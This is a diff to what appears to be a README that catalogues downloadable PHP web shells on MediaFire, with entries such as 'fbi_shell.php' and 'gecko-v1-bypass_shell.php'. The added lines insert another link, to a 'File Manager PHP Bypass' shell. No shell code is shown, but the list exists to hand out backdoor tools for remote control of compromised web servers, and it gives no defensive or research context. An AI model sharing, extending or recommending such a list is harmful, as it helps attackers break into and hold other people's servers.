@@ -42,6 +42,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/awp5cctr75qedz8/fbi_shell.php/file">Federal Bureau of Investigation</a>
 <img src="https://imgur.com/XlHNpBt.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/0zc7qe7r4jxh5sb/fmp-bypass_shell.php/file">File Manager PHP Bypass</a>
+<img src="https://imgur.com/FMkULRj.png" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/ctdduqf9xk7k3ph/gecko-v1-bypass_shell.php/file">Gecko v1 Bypass</a>
 <img src="https://imgur.com/iLaKtvd.png" alt="beruangsalju profile">
  
